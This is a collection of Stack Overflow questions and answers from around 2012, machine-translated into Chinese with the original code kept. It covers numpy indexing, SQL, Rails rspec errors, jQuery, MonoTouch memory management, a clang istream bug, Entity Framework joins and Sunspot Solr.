我不完全确定你想要什么，但也许[`ix_`](http://docs.scipy.org/doc/numpy/reference/generated/numpy.ix_.html)会有所帮助？我想我见过比我在类似情况下使用它更了解 numpy 的人。

```
>>> from numpy import array, arange, ix_
>>> a = arange(25).reshape(5,5)
>>> Xinds = array([1,2,3])
>>> Yinds = array([1,2,3])
>>> a
array([[ 0,  1,  2,  3,  4],
       [ 5,  6,  7,  8,  9],
       [10, 11, 12, 13, 14],
       [15, 16, 17, 18, 19],
       [20, 21, 22, 23, 24]])
>>> a[ix_(Xinds, Yinds)]
array([[ 6,  7,  8],
       [11, 12, 13],
       [16, 17, 18]])
>>> a[ix_(Xinds+1, Yinds)]
array([[11, 12, 13],
       [16, 17, 18],
       [21, 22, 23]])
>>> Y2inds = array([1,3,4])
>>> a[ix_(Xinds, Y2inds)]
array([[ 6,  8,  9],
       [11, 13, 14],
       [16, 18, 19]])
>>> a[ix_(Xinds, Y2inds-1)]
array([[ 5,  7,  8],
       [10, 12, 13],
       [15, 17, 18]]) 
```

# asp.net - 如何返回最后输入的项目？

> ID：10989453
> 
> 赞同：0
> 
> 时间：2012-06-12T01:17:36.057
> 
> 标签：asp.net, sql, vb.net, select

我正在尝试根据输入的日期从我的数据库中获取最后一个条目。sql 不能完全按照我的意愿工作。这是我的sql

```
SELECT TOP 1 * FROM BILLS_HITS ORDER BY DATETIMEADD DESC 
```

有人能看出它有什么问题吗？sql 返回日期为“6/6/2012 7:10:11 AM”的记录，而不是 2012 年 6 月 10 日的记录。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T01:32:02.090

使用更多与数据库无关的方法：

```
SELECT *
FROM
    BILLS_HITS
WHERE
    DATETIMEADD = (SELECT MAX(DATETIMEADD) FROM BILLS_HITS) 
```

该`TOP`关键字更特定于 MSSQL，而上述查询适用于大多数其他 DBMS，包括 MSSQL。

此外，为了快速进行选择，您可能希望在列上放置一个索引`DATETIMEADD`

如果它不起作用，请确保该`DATETIMEADD`列是正确的日期/日期时间类型，而不仅仅是 varchar/char/text 字符串。

# iphone - 适用于 iPhone 的 Adsense API

> ID：10989456
> 
> 赞同：0
> 
> 时间：2012-06-12T01:18:14.307
> 
> 标签：iphone, ipad, adsense

我正在尝试复制此应用程序 [http://itunes.apple.com/us/app/quickadsense-google-adsense/id495845748?mt=8](http://itunes.apple.com/us/app/quickadsense-google-adsense/id495845748?mt=8) 但我不确定，如果有任何 API 或 RSS 或其他东西可以保留通过adsense跟踪报告。任何想法，这个应用程序是如何开发的？它显示综合浏览量、点击次数、每日平均数、国家/地区报告等等。

非常感谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T01:23:00.117

我从这里开始：[https](https://developers.google.com/adsense/management/index)
://developers.google.com/adsense/management/index它提供了一些关于 Adsense API 入门的好信息。

# html - CSS：将 _blank 应用于多个链接的简单方法？

> ID：10989458
> 
> 赞同：0
> 
> 时间：2012-06-12T01:18:31.880
> 
> 标签：html, css

每天我向 Intranet 页面添加大约 50 个链接 + 是否有一种简单的方法可以添加 _blank 属性 - 通过使用 CSS 而不是将其应用于我放入的 EVERY.SINGLE 链接？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T01:20:51.457

[为此使用 JavaScript](http://www.sitepoint.com/standards-compliant-world/)：

```
function externalLinks() { 
    if (!document.getElementsByTagName) return; 
    var anchors = document.getElementsByTagName("a"); 
    for (var i=0; i<anchors.length; i++) { 
        var anchor = anchors[i]; 
        if (anchor.getAttribute("href"))      
            anchor.target = "_blank"; 
    }  
} 
window.onload = externalLinks; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T01:20:55.917

不`_blank`。与 CSS 无关。不过，有一种使用 Javascript 的简单方法。

# android - 日志条目“onDestroy 为 com.myapp 保持亮灯”是什么意思？

> ID：10989459
> 
> 赞同：2
> 
> 时间：2012-06-12T01:18:34.410
> 
> 标签：android

我在整个互联网和这个网站上进行了搜索，但我无法弄清楚..这只是 Android 的一种口舌方式，让我知道我的应用程序处于循环中的某个时刻吗？我突然开始在 logcat 中看到这个条目，我很想知道它的真正含义.. 谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:27:58.240

我不知道这*具体*意味着什么，因为它几乎可以肯定取决于应用程序（如果它是 Android 的东西，你的搜索可能会显示一些东西）。但我可以做出有根据的猜测。

虽然`onDestroy`通常可能期望该方法尽可能多地关闭应用程序，但重新创建该应用程序状态可能需要一些时间。

因此，聪明的编码人员可能会决定保持某种状态，以便下次加快启动过程。

这就是“开着灯”通常的意思，一个例子是即使你已经完成了浴室的灯，让下一个人使用它（有点浪费，除非下一个人马上进去）。

对于更多与编程相关的示例，假设您的应用程序在启动时需要长时间运行的计算。您不必每次都这样做，而是通过确保将其存储在某个地方并且可以轻松地重新启动来“保持灯亮”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-24T21:13:27.800

这是向您表明您没有正确关闭位置和/或地图提供者的 MapActivity。

他认为你是一个肮脏的人，并清理了你身后的烂摊子，但他现在很沮丧。

你必须解决：

*   永远不要再这样做了。
*   向 MapActivity 献花以求原谅。

玩得开心 ！

# ruby-on-rails - RunTimeError：rspec 2.10.1 中的 ActionController::RackDelegation 用于 rails 3.1.4 应用程序控制器

> ID：10989461
> 
> 赞同：9
> 
> 时间：2012-06-12T01:19:24.613
> 
> 标签：ruby-on-rails, ruby, http, ruby-on-rails-3.1, rspec2

在我们的 rails 3.1.4 应用程序中，`rspec`用于测试`require_signin`应用程序控制器中的公共方法。这是方法require_signin：

```
 def require_signin
    if !signed_in?  
      flash.now.alert = "Log in first!"
      redirect_to signin_path
    end
  end 
```

这是`rspec`代码：

```
it "should invoke require_signin for those without login" do
  controller.send(:require_signin)
  controller {should redirect_to signin_path}  
end 
```

上面`rspec`会产生巨大的多页错误，如下所示：

```
RuntimeError:←[0m
       ←[31mActionController::RackDelegation#status= delegated to @_response.status=, but @_response is nil: #<ApplicationController:0x3
a67f10 @_routes=nil, @_action_has_layout=true, @_view_context_class=nil, @_headers={"Content-Type"=>"text/html"}, @_status=200, @_reques
t=#<ActionController::TestRequest:0x3a68720 @env={"rack.version"=>[1, 1], "rack.input"=>#<StringIO:0x34fad60>, ........ 
```

代码可能有什么问题`rspec`？非常感谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-06-17T19:22:10.227

我遇到了这个错误，并意识到我通过调用我想要测试的帮助方法来触发控制器上的重定向，但我实际上还没有实例化测试请求。在调用`get :index`期望之前调用消除了错误。

```
it "redirects if some condition" do
  subject.send(:helper_method)
  get :action # <= Need this before setting expectation below
  response.should redirect_to("/somewhere")
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-07T11:02:35.790

如果你想检查动作机制，你应该在这样的调用`should_receive`之前使用`send`

```
it "should redirect to signin_path" do
  controller.should_receive(:redirect_to).with(signin_path)
  controller.send(:require_signin) 
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-10T22:11:13.217

可能不是完全有用，但我在遇到同样的错误后来到这里。我从一个通过的测试套件开始，进行了一些更改，然后开始出现以下错误：

```
RuntimeError:
    ActionController::RackDelegation#status= delegated to @_response.status=, but @_response is nil:
    ...many lines... 
```

仔细查看错误后，我注意到它在某处说：

```
@flashes={:alert=>"You have to confirm your account before continuing."} 
```

我刚刚在设计中添加了该`:confirmable`选项，并意识到我创建的所有尝试登录的用户都未确认，因此无法成功登录。我需要为`confirmed_at Time.now`用户添加到我的工厂/夹具创建中。不过，在您的示例中，您似乎正在尝试在未登录时进行测试，所以我不确定这是否一定适用。

# javascript - 创建接管页面

> ID：10989463
> 
> 赞同：0
> 
> 时间：2012-06-12T01:19:46.790
> 
> 标签：javascript, css

当用户访问网站时需要有一个接管页面，例如 www.domain.com，而不是立即显示内容，而是显示一个启动页面。然后，他们可以选择通过单击链接来访问主页。

1.  有没有办法在不更改主页上的代码的情况下做到这一点，除了包含一个满足要求的 javascript 文件，即用另一个 HTML 页面接管页面？

2.  我能找到一个例子吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:29:37.047

您可以对另一个 IP 进行 DNS“重写”，然后在另一个 Web 服务器上捕获或简单地复制/粘贴原始 HTML 内容并显示它，但也可以添加此 HTML 启动通知。

但是，如果不更改页面内容或访问代码，就无法添加启动页面。

* * *

如果您有权访问 HTML 代码，则可以包含您有权访问的 JavaScript 文件，也可能包含在其他服务器上。还为未禁用 JavaScript 的访问者添加一个 noscript 标签。

例子：

```
<script src="http://www.asdf.com/you/have/access/to/this/file.js" type="text/javascript" />
<noscript>SPLASH NOTICE</noscript> 
```

file.js 的外观如何，您可以[提出一个额外的问题](https://stackoverflow.com/questions/ask)。或检查[G](https://www.google.com/search?q=fullscreen%20splash%20javascript)。

这个“远程”JavaScript 文件的好处是，您可以稍后从文件中删除启动通知，而无需再次接触原始代码。

# jquery - 不使页面标题模态的jquery模态对话框

> ID：10989464
> 
> 赞同：0
> 
> 时间：2012-06-12T01:19:49.023
> 
> 标签：jquery, jquery-ui, modal-dialog

我们需要一个模态对话框，使页面模式化，除了页面的标题区域，有点像两个独立的区域。标题元素仍然处于活动状态，当它们被单击或调用时，对话框消失并且被调用的标题元素正常工作。这可以通过 jquery 对话框或其他库实现吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T01:29:07.067

这是[jQuery BlockUI 插件](http://jquery.malsup.com/block/#element)的一个很好的用例。如果您的页面上有除容器中的标头之外的所有内容，则可以将其与插件的元素阻止一起使用，以防止用户与页面交互。

代码看起来像这样。

HTML：

```
<header></header>
<div id="everything-else">
    <!-- everything -->
</div> 
```

JS：

```
$(function() {
    $('#everything-else').block();
}); 
```

# google-analytics - Liferay 中是否有内置的谷歌分析替代方案

> ID：10989467
> 
> 赞同：2
> 
> 时间：2012-06-12T01:20:24.543
> 
> 标签：google-analytics, liferay

我正在寻找一个类似 portlet 的解决方案，它可以收集和报告 Liferay 中的使用分析......但不幸的是，谷歌分析不是一种选择。

除了通常的跳出率和退出率、推荐、来源等之外，按社区、组、会话跟踪的统计数据。我知道我有点要求重新发明轮子，但是可以收集大量使用数据谷歌不能的Liferay。我已经检查[过 PiWik](http://piwik.org/)，它看起来非常令人印象深刻。

有什么建议么？TIA,

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-04-14T11:01:33.077

截至 2015 年，有 Audience Targeting 插件，它（至少对于 Liferay 6.2）捆绑了 analytics-api / analytics-hook 模块，收集一些有用的分析数据。现在想：

1.  到目前为止，它们似乎没有任何*独立*用途，因为它们被引入，我相信，以启用*内容访问*、访问*页面*和受众定位本身中的其他此类规则；您在任何提供的 portlet 中都看不到原始事件

2.  这些事件以行的形式存储在 SQL 数据库中，所以我会担心它的长期性能（每分钟有数千次点击等），尽管我说这纯粹是理论上的，因为我自己也没有做过任何测试检查是否实施了一些性能提升措施

但是，您可以做的是将您自己的 portlet 放在一起，该 portlet 将根据存储在`CT_Analytics_AnalyticsEvent`表中的数据创建一些图表等。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T04:47:33.433

现在，我不认为有任何可用的开箱即用功能，您可能需要创建它。可以有2件事

1）如果您需要实时/网络分析，您需要创建一个javascript库（这与创建谷歌分析库相同）

2) 这个选项很简单。Liferay 将所有内容存储在数据库中，您可以拥有一个报告 portlet，它将根据数据显示报告。我们为一个项目执行此操作，在该项目中我们跟踪会话 ids/ip 并登录 portlet 的用户详细信息。

要实现第 2) 点，您可以创建新的 Liferay 服务，该服务将用于存储和检索这些数据。

希望这可以帮助

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T20:02:50.183

您已经提到了 Piwik，它类似于谷歌分析。您可能有自己的主题（几乎每个人都将外观更改为看起来像他们自己的网站），并且将相关的 piwik-stats-snippet 放置在其中非常合适。

正如 Felix 建议的那样，您还可以挖掘您的日志文件。Liferay 存储了一些数据，你的网络服务器访问日志也很值得挖掘。而且，当然，您可以更改您的主题，以便为每个页面访问记录更多内容，只需注意不要在一个页面请求期间写入过多内容而造成性能瓶颈。

所以，回到你的问题：像谷歌分析这样的内置：不。易于集成（如 Piwik）：是的，当然。完全可定制：是的，当然。

编辑：碰巧大卫[创建并记录了一个集成](https://www.liferay.com/community/wiki/-/wiki/Main/Adding+Piwik+Web+Analytics+to+Liferay)，使使用 Piwik 更加容易

# php - URL重写后，GET请求发生了什么

> ID：10989468
> 
> 赞同：-1
> 
> 时间：2012-06-12T01:20:35.443
> 
> 标签：php, mod-rewrite, url-rewriting

> **可能重复：**
> [重写包含问号的 URL](https://stackoverflow.com/questions/10095704/rewriting-url-that-contains-question-mark)

嗨，一个关于 url 重写的菜鸟问题

例如。

```
Http://localhost/example/index.php?url=test/test&id=123 
```

在 URL 重写后 URL 变为

```
Http://localhost/example/test/test 
```

只是想知道服务器端页面是否仍然会获得该`$_GET['id']`价值和`$_GET['url']`价值？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T01:23:16.147

如果您使用[[QSA] 标志](http://httpd.apache.org/docs/2.0/mod/mod_rewrite.html#rewriterule)重写以保留现有查询参数，则可以获取 GET 参数，否则不能。因为 RewriteRule 上的正则表达式不是针对查询参数运行的。

# jquery - 尝试在远程 javascript 加载后隐藏图像

> ID：10989471
> 
> 赞同：2
> 
> 时间：2012-06-12T01:21:02.320
> 
> 标签：jquery, image, hide

好的，我有一个问题，我似乎找不到完全正确的解决方案 - 我想我很接近 - 使用 jquery，我在标签中有这个：

```
<script type="tex/javascript">
$('#waitdiv').eq(1).ready(function() {
$("#loadingdiv").hide();
});

</script> 
```

这是相关的 HTML 代码：

```
<div id="loadingdiv" ><img src="images/pleasewait.gif" />
<div id="waitdiv" >
<script type="text/javascript" id="privatelabel" src="**REMOTE URL WITH custom code that loads third party app"> </script>
 </div></div> 
```

正如您可能看到我正在尝试做的那样，我想显示请等待动画 gif（或我放置的任何图像），直到后续 div 能够加载（它在几秒钟内加载 10 的 8 倍） ，但有时会挂起 10 到 30 秒或更长时间），然后隐藏“加载”图像。

我以为我已经用一些简单的 jquery 解决了它，但显然我还没有掌握它。我还没有尝试“反过来”（也就是说，当 waitdiv 就绪状态为假时，显示（）有问题的图像..） - 但在我看来，我想等到它加载并且就绪状态为真.. ?

我已经尝试了这里（和其他地方）发布的其他几个解决方案，但似乎找不到任何可以完全满足我需要做的事情，或者“解决方案”在我的特定情况下不起作用。

我想我只是遗漏了一些简单的东西——对于这里的专家来说可能是显而易见的，但我现在只是被惊呆了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T01:31:29.010

也许您可以使用 jQuery 的[getScript](http://api.jquery.com/jQuery.getScript/)方法。像这样：

```
$.getScript('yourcustomsource',function() { $("#loadingdiv").hide(); }); 
```

这将加载并执行脚本，一旦加载，它就会隐藏您的加载图像。

# ios - 使用 MonoTouch 和 MonoTouch.Dialog 进行内存/资源管理

> ID：10989473
> 
> 赞同：19
> 
> 时间：2012-06-12T01:21:12.237
> 
> 标签：ios, memory-management, xamarin.ios, monotouch.dialog

我有一个具有 UITabBarController 的 MonoTouch 应用程序，每个选项卡都是 UINavigationController。其中一些包装了一个 UIViewController，它添加了一个 UITableView 和一个 UIToolbar，而另一些包装了一个 DialogViewController。

到目前为止，我还没有过多关注内存/视图管理（我主要是在模拟器中运行），但是当我开始在真实设备上进行测试时，我注意到由于内存不足而导致的一些故障（例如，应用程序被终止，我从日志中发现 DidReceiveMemoryWarning 在此之前被调用）。其他时候，我注意到应用程序响应的长时间停顿，我认为这是由于 GC 周期造成的。

到目前为止，我一直假设我推送到导航堆栈的每个 DialogViewController 都会清理它的视图和其他在我弹出它时分配的东西。但我开始意识到这可能并不容易，我需要开始调用 Dispose() 。

是否有关于如何使用 MonoTouch 和 MT.D 管理资源和内存的最佳实践？具体来说：

*   弹出后是否需要在 DialogViewController 上调用 Dispose？如果是这样，最好在哪里执行此操作？（ViewDidUnload？DidReceiveMemoryWarning？析构函数？）
*   DVC 是否会自动处理传递给它的 RootElement 之类的对象，还是我需要担心这个？它作为渲染表格单元格（例如 StyledStringElement）的一部分加载的 UIImages 怎么样？
*   有没有我应该调用 GC.Collect() 来更好地分隔集合的地方，以便在发生 GC 时不会受到响应的影响？
*   分代垃圾收集器是否有助于解决交互问题，是否足够稳定，可以在生产应用程序中使用？（我相信它在 MonoDevelop 3.0.2 / MT 4.3.3 中仍然被称为“实验性”）
*   我需要在 DidReceiveMemoryWarning 中做些什么来降低 iOS 拍摄我的应用程序的可能性？由于每个不可见的视图控制器似乎都收到了这个调用，我假设我应该清理那个视图控制器的资源......我应该做我在 ViewDidUnload 中做的同样的事情吗？
*   我似乎没有调用我的 ViewDidUnload（即使在我收到 DidReceiveMemoryWarning 之后）。事实上，我不记得曾经在我的日志中看到过它。如果 iOS 总是在 DidReceiveMemoryWarning 之后调用我的 ViewDidUnload，我可以在 ViewDidUnload 中进行所有清理......在 ViewDidUnload 和 DidReceiveMemoryWarning 之间划分清理责任的最佳方法是什么？

对于这个问题的一般性质，我深表歉意——这似乎是一个很好的白皮书主题，但我找不到任何......

**更新**：为了使问题更具体：在使用 Instruments 和 Xamarin Heapshot 分析器之后，我很清楚当用户弹出导航堆栈时我正在泄漏 UIViewControllers。Rolf 提交了一个[错误](https://bugzilla.xamarin.com/show_bug.cgi?id=1889)为此，它有两个重复，所以这不仅仅是我一个真正的问题。不幸的是，我还没有为泄露的 UIViewControllers 找到一个好的解决方法——我还没有找到一个对它们调用 Dispose() 的好地方。释放 ViewDidLoad 分配的资源的自然位置是在 ViewDidUnload 消息中，但它从未在模拟器上被调用，因此我的内存占用不断增长。在设备上，我确实看到了 DidReceiveMemoryWarning，但我不愿意使用它作为释放我的 viewcontroller 及其资源的地方，因为我不能保证 iOS 会真正卸载我的视图，因此不能保证我的 ViewDidLoad 会再次被调用要么（导致 ViewDidAppear 需要针对其底层资源被处置的情况进行防御性编码）。我'

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-06-14T05:51:54.790

我在 MT.D 源代码和分析器中花了几天时间。虽然我仍在寻找关于实现 DidReceiveMemoryWarning 和 ViewDidUnload 的最佳设计模式的一般指导，但我确实有一些一般性的观察要分享，这可能对某人有用：

1.  MonoTouch.Dialog 表现得非常好。它在正常使用下不会泄漏任何资源。它在 DVC.Root 下保留了一个控件树，每个 Element 的 Dispose 方法都正确地 Dispose 底层 UIKit 控件。如果您已替换 DVC.Root，您甚至不必担心处置旧的 RootElement - 属性设置器会自动为您处置它。总体而言，MT.D 似乎没有遭受任何重大的内存问题。有一个例外 - 见下文。
2.  创建您自己的自定义元素（例如 MultilineEntryElement）时，请确保重写 Dispose(bool) 方法，释放底层 UIKit 控件（例如 UITextView），并链接基类 Dispose() 方法。Miguel 的 MT.D github 项目中的源代码提供了很多很好的示例。所有元素都实现了标准的 Dispose 模式（尽管它们省略了调用 Dispose(false) 的析构函数/终结器）。
3.  在实现自定义视图控制器时，一般不需要在 UIViewController 子类上实现 Dispose，也不需要在 TableView DataSource 或 Delegate 类上实现。当视图控制器被 GC'ed 时，它将正确地调用其引用的 Dispose。您在 DataSource 中分配的所有单元格都将被正确处理。
4.  作为 (3) 的一个例外 - 在将我自己的子视图添加到 TableView 的单元格时，我遇到了一个令人讨厌的问题。这个子视图是我创建的一个名为“UICheckbox”的控件，它最终继承自 UIImageView，它有两个 UIImage（打开和关闭）和一个名为 Clicked 的公共事件。我只在引用 DataSource 成员的事件处理程序与此事件挂钩时遇到问题（如果事件处理程序不引用 DataSource 或控制器本身，一切都很好）。但是，当满足上述条件并关闭控制器时，显然存在一些 GC 无法弄清楚的循环，并且我放在 TableView 上的每个 UICheckbox 都被泄露（连同它的图像）。我发现解决此问题的唯一方法是向 ViewDidDisappear 添加代码以处理 ViewController 并清理其状态 IFF 它不再位于导航堆栈中的任何位置。这是hacky，但它的工作原理。
5.  一般来说，我遵循以下模板在我的视图控制器中分配对象：

    *   在构造函数中不分配任何内容（仅用于传递状态）
    *   在 ViewDidLoad 中创建一个控制树（并在 ViewDidUnload 中处理它）。想想 XAML 中的“InitializeComponent”（如果有帮助的话）。如果 UIViewController 要将 DialogViewController 推送到导航堆栈，那么 ViewDidLoad 是创建 DVC 的好地方。
    *   在 ViewDidAppear 中初始化控件树中的值。例如，您可以在此方法中添加/删除/替换元素、部分，甚至 DVC 的根。但不要创建新的 DVC。
6.  当用户向上导航导航堆栈时，泄漏 ViewControllers 存在一个普遍问题（我在问题的“更新”中引用了 bugzilla 链接）。这也会影响 MT.D。有一个相当简单的解决方法 - 在父视图控制器的 ViewDidAppear 中添加以下代码行：

    ```
     // HACK: touch the ViewControllers array to refresh it (in case the user popped the nav stack)
        // this is to work around a bug in monotouch (https://bugzilla.xamarin.com/show_bug.cgi?id=1889)
        // where the UINavigationController leaks UIViewControllers when the user pops the nav stack
        int count = this.NavigationController.ViewControllers.Length; 
    ```

Rolf 很好地解释了为什么会发生这个错误以及为什么解决方法在 bugzilla 链接中有效，所以我不会重复它。

我希望有人觉得这很有用。我也希望比我聪明的人对如何处理 DidReceiveMemoryWarning 以及如何在该方法和 ViewDidUnload 之间拆分工作有一些指导。

**更新**：还有一些注意事项：

*   我现在实现了 DidReceiveMemoryWarning 和 ViewDidUnload 的协议：前者总是传递给每个视图控制器，而后者只发送给当前未显示的视图控制器，并且不比导航堆栈的根更深。最后，我决定忽略 DidReceiveMemoryWarning，因为我真的没有可以缓存和转储的图像（根据 iOS 指南）。在 ViewDidUnload 中，我释放了我在 ViewDidLoad 中分配的所有资源。
*   我的应用程序有一个 TabBar，其中每个选项卡都承载一个 UINavigationController，其中大部分都推送一个 DialogViewController。我正在处理的一个问题是在 ViewDidUnload 释放对它的引用之后泄漏 DialogViewController。我尝试在 ViewDidUnload 中处理 DVC，但 iOS 一直想要重新调用它，并且我在调用 GC 对象上的选择器时遇到了异常。我发现了原因——导航控制器在其 ViewControllers 数组中保留了 DVC。解决方案是通过在其位置创建一个长度为零的数组来释放该数组 - 在 ViewDidUnload 中：

    ```
    this.ViewControllers = new UIViewController[0]; 
    ```

旧数组现在将被 GC 处理，DVC 也将被 GC，因为没有任何东西指向它了。iOS 永远不会重新调用该对象。注意 - 无需在 DVC 上调用 Dispose。

# c++ - Is this a compiler bug or it's my code?

> ID：10989483
> 
> 赞同：7
> 
> 时间：2012-06-12T01:22:34.373
> 
> 标签：c++, g++, clang, istream, clang++

Here is a sample code:

```
#include <iostream>
#include <stdexcept>
#include <cstring>
#include <ctime>
#include <sstream>

using std::cout;
using std::endl;

std::size_t const BUF_SIZE(1000);

std::ostream& operator<<(std::ostream& os, std::tm const& rhs)
{   
    os << asctime(&rhs);
    return os; 
}   

std::istream& operator>>(std::istream& is, std::tm& rhs)
{   
    while (is.peek() == ' ' || is.peek() == '\t')
    {   
        is.get();
    }   
    std::streampos curPos = is.tellg();
    char buf[BUF_SIZE];
    is.getline(buf, BUF_SIZE);
    char* ptr = strptime(buf, "%D %T", &rhs);
    if (ptr == 0)
    {   
        throw std::runtime_error("strptime() failed!");
    }   
    std::size_t processed = ptr - buf;
    is.seekg(curPos + static_cast<std::streampos>(processed));
    return is; 
}   

int main()
{   
    std::istringstream is("10101 07/09/12 07:30:00 123.24");
    int uuid(0);
    double price(0);
    std::tm ptime; std::memset(&ptime, 0, sizeof(tm));

    is >> uuid >> ptime >> price;
    cout << "UUID: " << uuid << endl;
    cout << "Time: " << ptime;
    cout << "Price: " << price << endl;
} 
```

where I'm trying to overload the << and >> operators for struct tm! If I compile my code with g++ and run it, I get:

```
UUID: 10101
Time: Sun Jul  9 07:30:00 2012
Price: 123.24 
```

Perfect!

But, if I compile it using clang++, I get:

```
UUID: 10101
Time: Sun Jul  9 07:30:00 2012
Price: 0 
```

OOPS!

What is going on? it this an issue with **clang** or it's the way i'm processing the **istream**?

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-12T03:21:32.983

I was able to reproduce this (g++ 4.7.0 and clang++ 3.1 with libc++-svn) and a brief debugging session showed that clang++ sets the `eofbit` after `getline` (which is normal), which then somehow causes `seekg` to set `failbit`. This sounds like a bug, given that seekg `first clears eofbit` (§27.7.2.3/41)

To work around, insert `is.clear()` anywhere between the `getline` and the `seekg`.

# pagination - simplexml 分页

> ID：10989484
> 
> 赞同：1
> 
> 时间：2012-06-12T01:22:36.457
> 
> 标签：pagination, simplexml

这是我从中提取的 api： [http ://api.eventful.com/rest/events/search?app_key=p4t8BFcLDtCzpxdS&location=Houston,Tx&sort_order=popularity&date=future](http://api.eventful.com/rest/events/search?app_key=p4t8BFcLDtCzpxdS&location=Houston,Tx&sort_order=popularity&date=future)

一切都很好，除了我对分页感到困惑。

当前页码和总页数在 xml 中提供。现在我只是不确定如何从中分页。

# php - SQL 用户验证栏

> ID：10989485
> 
> 赞同：0
> 
> 时间：2012-06-12T01:22:37.050
> 
> 标签：php, sql

所以我现在正在用 MYSQL 学习 PHP。制作有趣的用户注册和邮件验证系统。所以我知道使用 md5 哈希验证是标准的。但是，我只是想知道哈希匹配后激活帐户的标准方法是什么。

我正在考虑在验证完成后可能会做一些事情，比如将默认的 0 更改为 1。并使用它来确定未经验证的帐户和已验证的帐户。我只是想知道这有什么问题吗，有没有更好的方法？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T01:27:45.190

我会这样做，但如果你喜欢 SHA-1 或其他东西，我会建议你使用更强的散列。但这是一个很好的方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T01:30:38.770

你的方法应该没问题。

如今，使用`MD5`并不被认为是特别好的做法，因为 MD5 很容易破解。在这种情况下，使用合适的盐应该足以避免该问题。

作为一般规则使用`bcrypt`（或允许您调整工作因子的其他散列算法）可能会更好，因此您可以确保暴力破解永远不可行。

# c# - 实体框架多对多条件连接

> ID：10989487
> 
> 赞同：2
> 
> 时间：2012-06-12T01:22:56.680
> 
> 标签：c#, entity-framework

现在我有 3 个表：用于多对多关联的 User、Roles 和 User_Roles。我想创建一个搜索函数，该函数接受 RoleID 列表并返回具有该角色的用户。但是**如果 RoleID 列表为空，它应该返回所有 Users**。

这是我到目前为止所拥有的..

```
public static List<User> SearchUser(List<int> roleIDs)
{
    List<User> userList = new List<User>();
    using (var db = new DBContext())
    {
        var users = (
            from u in db.Users
            join ur in db.User_Role
                on u.UserID equals ur.UserID
            join r in roleIDs
                on ur.RoleID equals r
            select u
            ).Distinct().ToList();
    }
    return userList;
} 
```

但我无法找到一种方法来有条件地加入 User_Role 只有当 roleIDs 不为空时。

我也试过这个，但没有奏效。

```
var users = (from u in db.Users
             from r in roleIDs
             join ur in db.User_Role
                 on u.UserID equals ur.UserID
             where roleIDs.Count == 0 || ur.RoleID == r
             select u
                ).Distinct().ToList(); 
```

是否可以在实体框架中进行条件连接？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:07:51.473

分别对待每个案例。

```
public static List<User> SearchUser(List<int> roleIDs)
{
    using (var db = new DBContext())
    {
        if (roleIDs.Count == 0)
        {
             return db.Users.ToList();
        }

        var users = (
            from u in db.Users
            join ur in db.User_Role
                on u.UserID equals ur.UserID
            join r in roleIDs
                on ur.RoleID equals r
            select u
            ).Distinct().ToList();

        return users;
    }
} 
```

如果连接表未映射为单独的实体，您可以按如下方式简化连接。

```
public static List<User> SearchUser(List<int> roleIDs)
{
    using (var db = new DBContext())
    {
        if (roleIDs.Count == 0)
        {
             return db.Users.ToList();
        }

        var users = db.Users.Where(u => u.Roles.Any(r => roleIDsContains(r.Id)))
            .Distinct().ToList();

        return users;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-14T00:00:46.920

我最大的问题是在添加新的搜索条件时保持代码可维护性，并尽量减少数据库调用。我最终使用了 if 语句，但直到最后才从数据库中加载它。这导致了一个大的发送查询。我通过最后调用来强制数据库调用`.ToList()`。

```
public static List<user> SearchUser(List<int> roleIDs, List<int> hobbyIDs)
{
    List<User> Users = new List<User>();
    IQueryable<User> tempUsers = null;
    using (var db = new DBContent())
    {
        tempUsers = db.Users;

        if (roleIDs.Count > 0)
        {
            tempUsers = from u in tempUsers
                        join ur in db.User_Role on u.UserID equals ur.UserID
                        join r in roleIDs on ur.RoleID equals r
                        select u;
        }

        if (hobbyIDs.Count > 0)
        {
            tempUsers = from u in tempUsers
                        join uh in db.User_Hobby on u.UserID equals uh.UserID
                        join h in hobbyIDs on uh.HobbyID equals h
                        select u;
        }

        //Go get it from the database
        Users = ((ObjectQuery<User>)tempUsers)
            .Include("Address").Distinct().ToList();
    }
} 
```

# ruby-on-rails - 耙太阳黑子上的太阳黑子 Solr 错误：索引

> ID：10989488
> 
> 赞同：0
> 
> 时间：2012-06-12T01:22:58.953
> 
> 标签：ruby-on-rails, ruby-on-rails-3, solr, sunspot-solr

我正在尝试在 Rails 3 应用程序上为 Solr 使用 Sunspot gem。我已经关注 RailsCast #278，因为我使用的是 Windows，所以我必须执行 rake sunspot:solr:run，这似乎开始时没有错误。但是，当我尝试运行 rake sunspot:reindex 时出现错误：

```
No connection could be made because the target machine actively refused it. - connect(2) 
```

我正在为 mysql 使用 mysql2 gem。请指教。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-22T18:46:48.197

我在 Windows 上运行“bundle exec rake sunspot:solr:reindex”时遇到了同样的问题。解决方案是添加正确的 RAILS_ENV 选项，对我来说这是测试，例如

```
bundle exec rake sunspot:solr:reindex RAILS_ENV=test 
```

是的，您必须事先运行 solr 服务器：

```
bundle exec rake sunspot:solr:run RAILS_ENV=test 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T04:38:23.767

